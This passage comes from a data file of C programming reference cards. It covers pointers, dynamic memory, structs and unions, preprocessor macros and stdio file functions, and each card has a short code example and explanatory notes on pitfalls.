    sum: "Each element stores an address, which is useful for ragged data and lookup tables.",
    code: c`char *names[] = { "Ada", "Grace", "Linus" };

for (size_t i = 0; i < 3; i++) {
    puts(names[i]);
}

int x = 1, y = 2;
int *ptrs[] = { &x, &y };
*ptrs[0] = 10;`,
    note: "The strings are literals, so they cannot be modified. An array of pointers uses more memory than a 2D char array but allows different lengths.",
    pop: 5,
  },
  {
    title: "One-past-the-end pointer",
    cat: "Pointers",
    tags: ["pointer", "end", "past", "sentinel", "bounds", "array", "loop"],
    aka: "is it legal to point past the end of an array",
    sum: "You may form a pointer one past the last element, but you may not dereference it.",
    code: c`int a[5];

int *end = a + 5;   // legal
for (int *p = a; p != end; ++p) {
    *p = 0;
}

// *end is undefined behavior`,
    note: "This is the basis for half-open ranges [begin, end). Pointer comparisons only work within the same array.",
    pop: 3,
  },
  {
    title: "Pointer comparison",
    cat: "Pointers",
    tags: ["compare", "pointer", "order", "equality", "same", "array", "null"],
    aka: "can i compare two pointers with <",
    sum: "Equality works for any pointers; ordering is defined only within the same array.",
    code: c`if (p == NULL) ...
if (p == q) ...

int a[10];
int *lo = &a[2], *hi = &a[7];
if (lo < hi) ...        // same array: fine

// comparing pointers into different objects is unspecified`,
    note: "Use uintptr_t casts only for diagnostics, not for portable ordering.",
    pop: 4,
  },
  {
    title: "Cast pointers",
    cat: "Pointers",
    tags: ["cast", "pointer", "void", "type", "convert", "reinterpret", "byte"],
    aka: "how to cast a pointer to another type",
    sum: "void * converts implicitly in C; other pointer casts need an explicit cast.",
    code: c`int x = 42;
void *v = &x;         // implicit
int *p = v;           // implicit back in C

unsigned char *bytes = (unsigned char *)&x;
printf("%02x\n", bytes[0]);

int *q = (int *)bytes; // back to int`,
    note: "Casting does not convert the pointed-to data. Misaligned access and strict-aliasing violations are undefined behavior.",
    pop: 4,
  },
  {
    title: "uintptr_t and intptr_t",
    cat: "Pointers",
    tags: ["uintptr_t", "intptr_t", "integer", "address", "pointer", "cast", "stdint"],
    aka: "how to store a pointer in an integer",
    sum: "These stdint.h types are wide enough to hold a converted pointer.",
    code: c`#include <inttypes.h>
#include <stdint.h>

int x = 1;
uintptr_t addr = (uintptr_t)&x;
int *back = (int *)addr;

printf("%" PRIxPTR "\n", addr);`,
    note: "Useful for hashing and diagnostics. Do not use integer addresses to bypass lifetime or bounds rules.",
    pop: 3,
  },
  {
    title: "Wild pointer",
    cat: "Pointers",
    tags: ["wild", "uninitialized", "pointer", "garbage", "dangling", "null"],
    aka: "what is an uninitialized pointer",
    sum: "A local pointer starts with an indeterminate value; dereferencing it is undefined behavior.",
    code: c`int *p;        // wild: contains garbage
// *p = 1;     // undefined behavior

int *q = NULL; // safe sentinel
if (q) {
    *q = 1;
}`,
    note: "Initialize pointers to NULL or a real object. Compilers often warn with -Wuninitialized, but not always.",
    pop: 4,
  },
  {
    title: "Dangling pointer",
    cat: "Pointers",
    tags: ["dangling", "freed", "pointer", "invalid", "lifetime", "use", "after"],
    aka: "what is a dangling pointer",
    sum: "A pointer to an object that no longer exists. Any use is undefined behavior.",
    code: c`int *p = malloc(sizeof *p);
free(p);
p = NULL;      // prevents accidental reuse

char *bad(void) {
    char buf[32];
    return buf; // dangling as soon as the function returns
}`,
    note: "Setting the pointer to NULL does not fix other copies of the same address. Track ownership carefully.",
    pop: 5,
  },
  {
    title: "nullptr (C23)",
    cat: "Pointers",
    tags: ["nullptr", "null", "pointer", "c23", "type", "safe", "nullptr_t"],
    aka: "should i use null or nullptr in c23",
    sum: "C23 adds a typed null pointer constant, nullptr.",
    code: c`int *p = nullptr;

if (p == nullptr) {
    puts("null");
}

// nullptr has type nullptr_t; NULL is still available`,
    note: "Requires C23. NULL remains fine and is more portable to older compilers.",
    pop: 3,
  },
  {
    title: "Reading pointer declarations",
    cat: "Pointers",
    tags: ["declaration", "read", "const", "pointer", "syntax", "function", "array"],
    aka: "how to read complicated c declarations",
    sum: "Start at the name and read outward; const applies to what is immediately to its left.",
    code: c`const char *p;           // pointer to const char
char * const q = s;     // const pointer to char
const char * const r = s; // const pointer to const char

int (*fp)(int);         // pointer to function
int *arr[3];            // array of 3 pointers
int (*pa)[3];           // pointer to array of 3 ints

char **argv;            // pointer to pointer to char`,
    note: "The const is about what you can modify through which path, not about where the object lives.",
    pop: 5,
  },

  {
    title: "Allocate a 2D array",
    cat: "Memory",
    tags: ["2d", "array", "malloc", "allocation", "matrix", "rows", "columns", "contiguous"],
    aka: "how to allocate a two dimensional array with malloc",
    sum: "Allocate an array of row pointers, then a block per row — or one contiguous block.",
    code: c`int rows = 3, cols = 4;

// pointer-to-rows:
int **m = malloc(rows * sizeof *m);
for (int r = 0; r < rows; r++) {
    m[r] = malloc(cols * sizeof **m);
}
// free in reverse:
for (int r = 0; r < rows; r++) free(m[r]);
free(m);

// contiguous alternative:
int (*grid)[4] = malloc(rows * sizeof *grid);
grid[1][2] = 5;
free(grid);`,
    note: "The pointer-to-pointer form is not contiguous. The single-block form is faster and easier to free.",
    pop: 6,
  },
  {
    title: "realloc pitfalls",
    cat: "Memory",
    tags: ["realloc", "resize", "pointer", "failure", "move", "leak", "memory"],
    aka: "why is realloc losing my data or crashing",
    sum: "realloc may move the block and returns NULL on failure without freeing the original.",
    code: c`int *tmp = realloc(p, new_count * sizeof *p);
if (!tmp) {
    // p is still valid; handle the error
    free(p);
    return -1;
}
p = tmp;`,
    note: "Never write p = realloc(p, ...): on failure you lose the only pointer to the old block.",
    pop: 6,
  },
  {
    title: "Double free",
    cat: "Memory",
    tags: ["double", "free", "crash", "heap", "corruption", "ownership"],
    aka: "why does free say double free or corruption",
    sum: "Freeing the same allocation twice is undefined behavior.",
    code: c`free(p);
free(p);     // undefined behavior

// after the first free:
p = NULL;
free(p);     // safe: free(NULL) does nothing`,
    note: "Double frees often mean two owners. Decide who frees each allocation and set pointers to NULL after freeing.",
    pop: 6,
  },
  {
    title: "Memory leak",
    cat: "Memory",
    tags: ["leak", "memory", "lost", "malloc", "free", "valgrind", "asan"],
    aka: "how to find a memory leak in c",
    sum: "Allocated memory that is never freed keeps growing the process.",
    code: c`void leak(void) {
    char *buf = malloc(1024);
    // returns without free(buf)
}

// find leaks:
// gcc -fsanitize=address -g main.c
// valgrind --leak-check=full ./main`,
    note: "Every malloc needs a free on every path, including errors. Ownership should be documented at the API boundary.",
    pop: 6,
  },
  {
    title: "Memory layout of a program",
    cat: "Memory",
    tags: ["layout", "memory", "stack", "heap", "data", "bss", "text", "segments"],
    aka: "where are variables stored in memory",
    sum: "Code, initialized data, zeroed data, heap, and stack occupy different regions.",
    code: c`// high addresses
//   stack  — locals, grows down
//   ...
//   heap   — malloc, grows up
//   bss    — zero-initialized globals
//   data   — initialized globals
//   text   — machine code
// low addresses`,
    note: "ASLR randomizes addresses. The exact layout is platform- and linker-dependent.",
    pop: 4,
  },
  {
    title: "Shallow vs deep copy",
    cat: "Memory",
    tags: ["copy", "shallow", "deep", "struct", "pointer", "ownership", "clone"],
    aka: "why do two structs share the same string after copying",
    sum: "Assignment copies pointer values; a deep copy duplicates the pointed-to data.",
    code: c`struct Person { char *name; };

struct Person a = { .name = strdup("Ada") };
struct Person b = a;              // shallow: both share name
struct Person c = a;
c.name = strdup(a.name);          // deep copy of the string

free(a.name);
free(c.name);`,
    note: "Freeing a shallow copy's pointer leaves the original dangling. Document whether a struct owns its pointers.",
    pop: 5,
  },
  {
    title: "aligned_alloc",
    cat: "Memory",
    tags: ["aligned", "alloc", "alignment", "malloc", "simd", "posix", "memory"],
    aka: "how to allocate aligned memory",
    sum: "Allocate memory with a specified alignment.",
    code: c`#include <stdlib.h>

void *p = aligned_alloc(64, 128);  // 64-byte aligned, 128 bytes
if (!p) {
    perror("aligned_alloc");
}
free(p);

// POSIX alternative:
void *q;
if (posix_memalign(&q, 64, 128) != 0) { /* error */ }`,
    note: "C11. The size must be a multiple of the alignment, and alignment must be a power of two.",
    pop: 3,
  },
  {
    title: "alloca",
    cat: "Memory",
    tags: ["alloca", "stack", "allocate", "temporary", "nonstandard", "memory"],
    aka: "how to allocate memory on the stack",
    sum: "Allocates stack memory that is freed automatically when the function returns.",
    code: c`#include <alloca.h>

void f(size_t n) {
    char *buf = alloca(n);
    // valid until f returns
}`,
    note: "Nonstandard, no failure check, and dangerous for large n or inside loops. Prefer a fixed buffer or malloc.",
    pop: 3,
  },
  {
    title: "Zero-size allocations",
    cat: "Memory",
    tags: ["malloc", "zero", "size", "realloc", "null", "edge", "case"],
    aka: "what does malloc 0 return",
    sum: "malloc(0) may return NULL or a unique pointer; behavior of realloc(p, 0) varies.",
    code: c`void *p = malloc(0);
if (p) {
    free(p);   // legal
}

// realloc(ptr, 0) is implementation-defined:
// it may free ptr and return NULL, or return a unique pointer.`,
    note: "Avoid relying on either behavior. Treat zero-size requests as a special case in your API.",
    pop: 3,
  },
  {
    title: "Allocation size overflow",
    cat: "Memory",
    tags: ["malloc", "overflow", "size", "integer", "multiply", "security", "calloc"],
    aka: "can malloc size calculation overflow",
    sum: "Multiplying a count by an element size can wrap size_t and allocate too little.",
    code: c`#include <stdint.h>

if (count > SIZE_MAX / sizeof *p) {
    return NULL;   // would overflow
}
int *p = malloc(count * sizeof *p);

// calloc checks the multiplication:
int *q = calloc(count, sizeof *q);`,
    note: "This is a classic security bug. Use calloc or an explicit SIZE_MAX check before multiplying.",
    pop: 5,
  },
  {
    title: "Ownership and who frees",
    cat: "Memory",
    tags: ["ownership", "free", "api", "contract", "malloc", "leak", "responsibility"],
    aka: "should the caller or the function free the memory",
    sum: "Decide explicitly whether a function borrows or transfers ownership of memory.",
    code: c`// caller owns the result:
char *make_greeting(const char *name) {
    char *s = malloc(strlen(name) + 7);
    if (s) sprintf(s, "Hello %s", name);
    return s;
}

char *g = make_greeting("Ada");
free(g);

// borrowed: do not free
void print_name(const char *name) {
    puts(name);
}`,
    note: "Returning const char * does not automatically mean borrowed. State ownership in the function comment.",
    pop: 5,
  },
  {
    title: "Arena allocator",
    cat: "Memory",
    tags: ["arena", "pool", "allocator", "bump", "bulk", "free", "performance"],
    aka: "how to allocate many objects and free them all at once",
    sum: "Bump-allocate from one block and reset the whole arena instead of freeing objects.",
    code: c`typedef struct {
    unsigned char *buf;
    size_t cap, used;
} Arena;

void *arena_alloc(Arena *a, size_t n) {
    size_t aligned = (n + 7) & ~(size_t)7;
    if (a->used + aligned > a->cap) return NULL;
    void *p = a->buf + a->used;
    a->used += aligned;
    return p;
}

void arena_reset(Arena *a) { a->used = 0; }`,
    note: "Great for parsers and per-frame data. It cannot free individual objects, and alignment must be handled.",
    pop: 3,
  },

  {
    title: "Struct initialization",
    cat: "Structs",
    tags: ["struct", "initialize", "init", "designated", "zero", "literal", "fields"],
    aka: "how to initialize a struct in c",
    sum: "Use an initializer list in member order, or name members with designators.",
    code: c`struct Point { int x, y; };

struct Point a = { 1, 2 };
struct Point b = { .y = 2, .x = 1 };
struct Point zero = { 0 };

// assignment after creation:
struct Point c;
c = (struct Point){ .x = 3, .y = 4 };`,
    note: "Unlisted members are zero-initialized. Reordering struct fields breaks positional initializers.",
    pop: 7,
  },
  {
    title: "Struct padding and alignment",
    cat: "Structs",
    tags: ["padding", "alignment", "sizeof", "struct", "memory", "layout", "offsetof"],
    aka: "why is my struct bigger than its fields",
    sum: "The compiler inserts padding so each member is properly aligned.",
    code: c`struct A {
    char c;    // 1 byte + 3 padding
    int i;     // 4 bytes
};             // sizeof likely 8

struct B {
    int i;
    char c;
    char pad[3]; // implied
};

// reorder largest to smallest to reduce padding:
struct C { int i; char a, b; };`,
    note: "Layout is implementation-defined. Use offsetof to inspect it and avoid writing raw structs to disk.",
    pop: 6,
  },
  {
    title: "offsetof",
    cat: "Structs",
    tags: ["offsetof", "offset", "struct", "member", "stddef", "layout", "padding"],
    aka: "how to get the byte offset of a struct member",
    sum: "offsetof gives the byte offset of a member within its struct.",
    code: c`#include <stddef.h>

struct Header {
    int type;
    int length;
    char data[16];
};

size_t off = offsetof(struct Header, data);
printf("%zu\n", off);   // 8 on typical systems`,
    note: "A compile-time constant. It does not work with bitfields and includes any padding before the member.",
    pop: 3,
  },
  {
    title: "Bitfields",
    cat: "Structs",
    tags: ["bitfield", "bits", "struct", "flags", "compact", "packing", "field"],
    aka: "how to use bitfields in a struct",
    sum: "Bitfields pack small unsigned integers into a shared storage unit.",
    code: c`struct Flags {
    unsigned ready : 1;
    unsigned mode  : 3;
    unsigned       : 4;   // unnamed padding
    unsigned error : 1;
};

struct Flags f = { .ready = 1, .mode = 5 };
f.error = 1;`,
    note: "Layout, ordering, and signedness are implementation-defined. Do not take addresses of bitfields or use them for file formats.",
    pop: 4,
  },
  {
    title: "Anonymous structs and unions",
    cat: "Structs",
    tags: ["anonymous", "struct", "union", "nested", "members", "c11", "variant"],
    aka: "how to access nested struct members directly",
    sum: "An unnamed struct or union member's fields become members of the outer struct.",
    code: c`struct Value {
    int kind;
    union {
        int i;
        double d;
    };            // anonymous union (C11)
    struct {
        int x, y;
    };            // anonymous struct
};

struct Value v = { .kind = 1, .i = 42, .x = 3, .y = 4 };
printf("%d %d\n", v.i, v.x);`,
    note: "C11 feature; widely supported as an extension before that. Only one anonymous member of a given kind can be active at a time.",
    pop: 3,
  },
  {
    title: "Flexible array member",
    cat: "Structs",
    tags: ["flexible", "array", "member", "struct", "malloc", "variable", "tail"],
    aka: "how to put a variable length array at the end of a struct",
    sum: "End a struct with an incomplete array and allocate extra bytes for the elements.",
    code: c`struct Buffer {
    size_t len;
    char data[];     // flexible array member
};

size_t n = 100;
struct Buffer *b = malloc(sizeof *b + n);
if (b) {
    b->len = n;
    memset(b->data, 0, n);
}
free(b);`,
    note: "Must be the last member and cannot be the only member. sizeof does not include the data. C99 feature.",
    pop: 4,
  },
  {
    title: "Self-referential struct",
    cat: "Structs",
    tags: ["self", "referential", "recursive", "struct", "linked", "list", "next"],
    aka: "how can a struct point to itself",
    sum: "A struct can contain a pointer to its own type, which makes linked structures possible.",
    code: c`struct Node {
    int value;
    struct Node *next;   // incomplete type pointer is fine
};

struct Node *head = NULL;

struct Node *n = malloc(sizeof *n);
if (n) {
    n->value = 1;
    n->next = head;
    head = n;
}`,
    note: "The pointer is allowed because its size is known. Embedding a struct by value would be infinitely large.",
    pop: 5,
  },
  {
    title: "Opaque struct",
    cat: "Structs",
    tags: ["opaque", "incomplete", "struct", "api", "header", "encapsulation", "private"],
    aka: "how to hide a struct definition in a header",
    sum: "Expose only a pointer type; keep the definition in the .c file.",
    code: c`// list.h
typedef struct List List;
List *list_new(void);
void list_free(List *list);
int list_push(List *list, int value);

// list.c
struct List {
    struct Node *head;
    size_t size;
};

List *list_new(void) {
    return calloc(1, sizeof(List));
}`,
    note: "Callers cannot use sizeof or allocate on the stack. This stabilizes the ABI and hides implementation details.",
    pop: 4,
  },
  {
    title: "Struct assignment",
    cat: "Structs",
    tags: ["struct", "assignment", "copy", "memberwise", "value", "semantics"],
    aka: "does assigning a struct copy it",
    sum: "Assignment copies every member, including embedded arrays — but pointers are copied shallowly.",
    code: c`struct Person {
    char name[32];
    int age;
};

struct Person a = { "Ada", 36 };
struct Person b = a;      // full member-wise copy
b.name[0] = 'A';          // does not affect a

struct Ref { char *name; };
struct Ref r1 = { .name = "Ada" };
struct Ref r2 = r1;       // both point to the same string`,
    note: "Arrays inside a struct are copied; pointed-to data is not. Padding bytes are copied too, which affects memcmp.",
    pop: 5,
  },
  {
    title: "Compare structs",
    cat: "Structs",
    tags: ["compare", "struct", "equal", "memcmp", "padding", "members"],
    aka: "how to compare two structs for equality",
    sum: "Compare members explicitly. memcmp may fail because of padding bytes.",
    code: c`int point_equal(struct Point a, struct Point b) {
    return a.x == b.x && a.y == b.y;
}

// risky:
if (memcmp(&a, &b, sizeof a) == 0) {
    // padding bytes may differ even when members match
}`,
    note: "C has no built-in struct ==. For arrays inside structs, compare them with memcmp or element-wise.",
    pop: 5,
  },
  {
    title: "Return a struct",
    cat: "Structs",
    tags: ["return", "struct", "function", "value", "compound", "literal"],
    aka: "can a function return a struct by value",
    sum: "Yes. Return an initializer or a named local; the compiler handles the copy.",
    code: c`struct Point make_point(int x, int y) {
    return (struct Point){ .x = x, .y = y };
}

struct Point p = make_point(1, 2);

// returning a named local is also fine:
struct Point copy(struct Point p) {
    return p;
}`,
    note: "Do not return a pointer to a local struct. Returning by value is safe but may copy large structs.",
    pop: 4,
  },
  {
    title: "Type punning with a union",
    cat: "Structs",
    tags: ["union", "type", "punning", "bits", "float", "reinterpret", "memcpy"],
    aka: "how to reinterpret bits as another type",
    sum: "A union can inspect one member through another, but this is implementation-defined in C.",
    code: c`union FloatBits {
    float f;
    uint32_t u;
};

union FloatBits v;
v.f = 1.0f;
printf("%08x\n", v.u);

// portable alternative:
uint32_t bits;
memcpy(&bits, &v.f, sizeof bits);`,
    note: "Reading an inactive member is implementation-defined (not strictly portable). memcpy is the safe way to reinterpret bytes.",
    pop: 4,
  },
  {
    title: "Tagged union",
    cat: "Structs",
    tags: ["tagged", "union", "variant", "enum", "kind", "discriminant", "sum"],
    aka: "how to store different types in one struct",
    sum: "Pair a union with an enum tag and check the tag before reading.",
    code: c`enum Kind { VAL_INT, VAL_STR };

struct Value {
    enum Kind kind;
    union {
        int i;
        char *s;
    };
};

void print(struct Value v) {
    switch (v.kind) {
    case VAL_INT: printf("%d\n", v.i); break;
    case VAL_STR: printf("%s\n", v.s); break;
    }
}`,
    note: "Reading the wrong member is undefined behavior. Keep the tag and union in sync.",
    pop: 5,
  },
  {
    title: "Packed structs",
    cat: "Structs",
    tags: ["packed", "struct", "alignment", "attribute", "binary", "wire", "format"],
    aka: "how to remove padding from a struct",
    sum: "A compiler extension can remove padding, usually for binary formats.",
    code: c`struct __attribute__((packed)) Header {
    uint8_t type;
    uint32_t length;   // no padding before this
};

// GCC/Clang; MSVC uses #pragma pack(push, 1)`,
    note: "Packed members may be misaligned, which is slow or illegal on some CPUs. Prefer explicit byte encoding for portable formats.",
    pop: 3,
  },
  {
    title: "Linked list",
    cat: "Structs",
    tags: ["linked", "list", "node", "next", "insert", "traverse", "free"],
    aka: "how to implement a linked list in c",
    sum: "Each node stores a value and a pointer to the next node.",
    code: c`struct Node {
    int value;
    struct Node *next;
};

// insert at head:
struct Node *push(struct Node *head, int value) {
    struct Node *n = malloc(sizeof *n);
    if (!n) return head;
    n->value = value;
    n->next = head;
    return n;
}

// free:
while (head) {
    struct Node *next = head->next;
    free(head);
    head = next;
}`,
    note: "Save next before freeing. A dummy head node can remove special cases in insert/delete.",
    pop: 6,
  },

  {
    title: "Macro pitfalls",
    cat: "Preprocessor",
    tags: ["macro", "pitfall", "parentheses", "side", "effect", "precedence", "define"],
    aka: "why is my macro giving the wrong answer",
    sum: "Macros are text substitution: parenthesize the body and every parameter, and avoid double evaluation.",
    code: c`#define SQUARE(x) x * x
SQUARE(1 + 2)        // 1 + 2 * 1 + 2 == 5

#define SQUARE(x) ((x) * (x))
SQUARE(1 + 2)        // 9

#define MAX(a, b) ((a) > (b) ? (a) : (b))
MAX(i++, j++)        // one argument is evaluated twice!`,
    note: "Prefer a static inline function when the argument has side effects or a known type.",
    pop: 6,
  },
  {
    title: "Stringize with #",
    cat: "Preprocessor",
    tags: ["stringize", "stringify", "hash", "macro", "string", "token"],
    aka: "how to turn a macro argument into a string",
    sum: "# inside a macro turns its argument into a string literal.",
    code: c`#define STR(x) #x

STR(hello)          // "hello"
STR(1 + 2)          // "1 + 2"

// expand the argument first with two levels:
#define XSTR(x) STR(x)
#define VERSION 3
XSTR(VERSION)       // "3", not "VERSION"`,
    note: "Whitespace inside the argument is normalized to single spaces. # must appear in a function-like macro.",
    pop: 3,
  },
  {
    title: "Token pasting with ##",
    cat: "Preprocessor",
    tags: ["paste", "token", "concat", "macro", "hash", "identifier", "generate"],
    aka: "how to concatenate tokens in a macro",
    sum: "## glues two preprocessing tokens into one.",
    code: c`#define CAT(a, b) a##b
int CAT(my, var) = 1;    // int myvar = 1;

#define MAKE_GETTER(type, name) \
    type get_##name(void)

MAKE_GETTER(int, count);  // int get_count(void)`,
    note: "The result must be a valid token. Use an extra indirection layer if arguments need to expand first.",
    pop: 3,
  },
  {
    title: "Variadic macros",
    cat: "Preprocessor",
    tags: ["variadic", "macro", "va_args", "dots", "c99", "log", "optional"],
    aka: "how to write a macro with a variable number of arguments",
    sum: "Use ... and __VA_ARGS__ to forward a variable argument list.",
    code: c`#define LOG(fmt, ...) \
    fprintf(stderr, fmt, __VA_ARGS__)

LOG("x = %d\n", x);

// C23 optional arguments:
#define LOG2(fmt, ...) \
    fprintf(stderr, fmt __VA_OPT__(,) __VA_ARGS__)

LOG2("done\n");`,
    note: "The GNU extension ,##__VA_ARGS__ also handles zero arguments. __VA_OPT__ is standard in C23.",
    pop: 4,
  },
  {
    title: "do-while(0) macros",
    cat: "Preprocessor",
    tags: ["macro", "do", "while", "statement", "safe", "semicolon", "block"],
    aka: "why do macros use do while 0",
    sum: "Wrap a multi-statement macro in do { } while (0) so it behaves like one statement.",
    code: c`#define CHECK(cond) do { \
    if (!(cond)) { \
        fprintf(stderr, "check failed: %s\n", #cond); \
        return -1; \
    } \
} while (0)

if (ready)
    CHECK(x > 0);
else
    puts("not ready");`,
    note: "do-while(0) works with semicolons and inside if/else without extra braces.",
    pop: 4,
  },
  {
    title: "#undef",
    cat: "Preprocessor",
    tags: ["undef", "undefine", "macro", "remove", "override", "define"],
    aka: "how to remove a macro definition",
    sum: "Remove a macro so later code sees the identifier normally.",
    code: c`#define DEBUG 1

#ifdef DEBUG
// debug code
#endif

#undef DEBUG

#ifdef DEBUG
// no longer compiled
#endif`,
    note: "Useful before redefining a macro or when including a header that must not see it.",
    pop: 2,
  },
  {
    title: "#if, #elif, and #else",
    cat: "Preprocessor",
    tags: ["if", "elif", "else", "conditional", "preprocessor", "platform", "compile"],
    aka: "how to compile different code for different platforms",
    sum: "Select code at compile time using constant preprocessor expressions.",
    code: c`#if defined(_WIN32)
    #define PATH_SEP '\\'
#elif defined(__linux__) || defined(__APPLE__)
    #define PATH_SEP '/'
#else
    #error "unsupported platform"
#endif

#if __STDC_VERSION__ >= 201112L
    // C11 or newer
#endif`,
    note: "The preprocessor understands integers and defined(), not C types. Undefined identifiers evaluate to 0.",
    pop: 4,
  },
  {
    title: "The defined operator",
    cat: "Preprocessor",
    tags: ["defined", "ifdef", "ifndef", "macro", "conditional", "exists"],
    aka: "how to check if a macro is defined in an if",
    sum: "defined(NAME) is true when the macro exists, even if its value is 0.",
    code: c`#if defined(FOO)
// FOO exists
#endif

#if defined(FOO) && FOO > 2
// FOO exists and is greater than 2
#endif

#if !defined(NDEBUG)
// assertions are enabled
#endif`,
    note: "Use defined() inside #if. #ifdef only tests one name and cannot be combined with && cleanly.",
    pop: 3,
  },
  {
    title: "#error",
    cat: "Preprocessor",
    tags: ["error", "compile", "stop", "message", "require", "version"],
    aka: "how to stop compilation with a message",
    sum: "Emit a diagnostic and fail the build.",
    code: c`#if !defined(__STDC_VERSION__) || __STDC_VERSION__ < 201112L
#error "This project requires C11 or newer"
#endif

#ifndef CONFIG_H
#error "include config.h before this header"
#endif`,
    note: "C23 adds #warning for a non-fatal diagnostic. Use #error for unmet build requirements.",
    pop: 3,
  },
  {
    title: "#pragma once",
    cat: "Preprocessor",
    tags: ["pragma", "once", "header", "guard", "include", "duplicate"],
    aka: "pragma once vs include guards",
    sum: "A one-line header guard supported by all major compilers.",
    code: c`#pragma once

// the rest of the header
int add(int a, int b);`,
    note: "Not ISO C but universally supported. Include guards are fully standard and work with copy/paste or unusual build systems.",
    pop: 5,
  },
  {
    title: "#line",
    cat: "Preprocessor",
    tags: ["line", "file", "directive", "generated", "debug", "source"],
    aka: "how to change __LINE__ and __FILE__",
    sum: "Set the line number and file name the compiler reports for following lines.",
    code: c`#line 100 "generated.c"
// the next line is reported as generated.c:100
int x = 1;

printf("%d %s\n", __LINE__, __FILE__);`,
    note: "Mostly for generated code and preprocessors. It does not affect program behavior.",
    pop: 2,
  },
  {
    title: "X macros",
    cat: "Preprocessor",
    tags: ["x", "macro", "list", "generate", "enum", "table", "drx"],
    aka: "how to generate an enum and strings from one list",
    sum: "Keep a list in one macro and expand it with different definitions.",
    code: c`#define COLORS(X) \
    X(RED)   \
    X(GREEN) \
    X(BLUE)

#define AS_ENUM(name) COLOR_##name,
enum Color { COLORS(AS_ENUM) };

#define AS_STRING(name) #name,
const char *color_names[] = { COLORS(AS_STRING) };

// color_names[COLOR_GREEN] == "GREEN"`,
    note: "Keeps enum values and their names in sync. The list macro must end without a semicolon.",
    pop: 3,
  },
  {
    title: "Include paths",
    cat: "Preprocessor",
    tags: ["include", "path", "I", "header", "search", "gcc", "clang", "directory"],
    aka: "how to add a header search directory",
    sum: "Use -I to add directories to the quoted-include search path.",
    code: c`gcc -I./include -I../shared main.c -o main

// main.c
#include "config.h"     // searches current dir, then -I dirs
#include <stdio.h>      // searches system dirs`,
    note: "Quoted includes search the including file's directory first; angle brackets do not. Order of -I flags matters.",
    pop: 4,
  },

  {
    title: "fopen modes",
    cat: "Files",
    tags: ["fopen", "mode", "read", "write", "append", "binary", "truncate", "open"],
    aka: "what do r w a and plus mean in fopen",
    sum: "The mode string chooses read/write/append, truncation, and binary or text.",
    code: c`FILE *r  = fopen("data.txt", "r");   // read, must exist
FILE *w  = fopen("data.txt", "w");   // write, truncates or creates
FILE *a  = fopen("data.txt", "a");   // append, creates if missing
FILE *rp = fopen("data.txt", "r+");  // read/write, must exist
FILE *wp = fopen("data.txt", "w+");  // read/write, truncates
FILE *ap = fopen("data.txt", "a+");  // read/append

// add b for binary on Windows:
FILE *rb = fopen("data.bin", "rb");`,
    note: "\"w\" destroys existing content immediately. Always check for NULL and fclose every stream.",
    pop: 6,
  },
  {
    title: "fread and fwrite",
    cat: "Files",
    tags: ["fread", "fwrite", "binary", "read", "write", "block", "struct"],
    aka: "how to read and write binary data",
    sum: "Read or write a number of fixed-size items and check the returned count.",
    code: c`#include <stdio.h>

struct Record { int id; double value; };
struct Record rec = { 1, 2.5 };

size_t written = fwrite(&rec, sizeof rec, 1, fp);
if (written != 1) perror("fwrite");

struct Record in;
size_t got = fread(&in, sizeof in, 1, fp);
if (got != 1) {
    if (feof(fp)) puts("short file");
    else perror("fread");
}`,
    note: "The return value counts items, not bytes. Raw structs are not portable across compilers or endianness.",
    pop: 5,
  },
  {
    title: "fseek and ftell",
    cat: "Files",
    tags: ["fseek", "ftell", "seek", "position", "offset", "size", "end"],
    aka: "how to get file size and jump to a position with fseek ftell",
    sum: "fseek moves the read/write position; ftell reports it.",
    code: c`if (fseek(fp, 0, SEEK_END) != 0) perror("fseek");
long size = ftell(fp);
if (size < 0) perror("ftell");

rewind(fp);   // back to the start

// jump to byte 100:
fseek(fp, 100, SEEK_SET);`,
    note: "long can overflow for files over 2 GB. Use fseeko/ftello (POSIX) for large files.",
    pop: 5,
  },
  {
    title: "rewind",
    cat: "Files",
    tags: ["rewind", "seek", "start", "reset", "file", "position"],
    aka: "how to go back to the beginning of a file",
    sum: "rewind returns to the start and clears the error indicator.",
    code: c`rewind(fp);
// equivalent to:
// fseek(fp, 0, SEEK_SET); clearerr(fp);`,
    note: "rewind returns void, so it cannot report failure. Use fseek when you need to check the result.",
    pop: 3,
  },
  {
    title: "fflush",
    cat: "Files",
    tags: ["fflush", "flush", "buffer", "write", "stdout", "stream", "sync"],
    aka: "how to force output to be written now",
    sum: "Push buffered output to the operating system.",
    code: c`printf("processing...");
fflush(stdout);       // show it before a long operation

fflush(fp);           // flush one output stream
fflush(NULL);         // flush all output streams

if (fflush(fp) != 0) perror("fflush");`,
    note: "Only meaningful for output or update streams. fflush(stdin) is undefined behavior. fflush does not fsync to disk.",
    pop: 5,
  },
  {
    title: "feof and ferror",
    cat: "Files",
    tags: ["feof", "ferror", "eof", "error", "end", "file", "clearerr"],
    aka: "how to tell end of file from a read error",
    sum: "Check ferror first, then feof, after a read fails.",
    code: c`int c;
while ((c = fgetc(fp)) != EOF) {
    putchar(c);
}

if (ferror(fp)) {
    perror("read");
} else if (feof(fp)) {
    puts("end of file");
}

clearerr(fp);   // reset both indicators`,
    note: "feof is only true after a read has already hit the end. Do not loop on while (!feof(fp)).",
    pop: 5,
  },
  {
    title: "remove and rename",
    cat: "Files",
    tags: ["remove", "rename", "delete", "move", "file", "unlink"],
    aka: "how to delete or rename a file in c",
    sum: "remove deletes a file; rename moves or renames it. Both return 0 on success.",
    code: c`#include <stdio.h>

if (remove("old.txt") != 0) {
    perror("remove");
}

if (rename("tmp.txt", "final.txt") != 0) {
    perror("rename");
}`,
    note: "remove also removes empty directories on POSIX. rename replaces an existing destination on POSIX but may fail on Windows.",
    pop: 4,
  },
  {
    title: "tmpfile",
    cat: "Files",
    tags: ["tmpfile", "temporary", "temp", "file", "anonymous", "scratch"],
    aka: "how to create a temporary file",
    sum: "tmpfile creates an anonymous temporary file that disappears when closed.",
    code: c`FILE *tmp = tmpfile();
if (!tmp) {
    perror("tmpfile");
    return 1;
}

fputs("scratch data", tmp);
rewind(tmp);
// read it back...
fclose(tmp);   // file is removed`,
    note: "Opened in binary update mode. Use mkstemp when you need a path or persistence.",
    pop: 3,
  },
  {
    title: "setvbuf",
    cat: "Files",
    tags: ["setvbuf", "buffer", "buffering", "stdio", "performance", "unbuffered"],
    aka: "how to disable or change stdio buffering",
    sum: "Choose full, line, or no buffering for a stream.",
    code: c`setvbuf(fp, NULL, _IOFBF, 1 << 16); // full buffering
setvbuf(fp, NULL, _IOLBF, 0);       // line buffering
setvbuf(fp, NULL, _IONBF, 0);       // unbuffered

// terminal-like behavior:
setvbuf(stdout, NULL, _IONBF, 0);`,
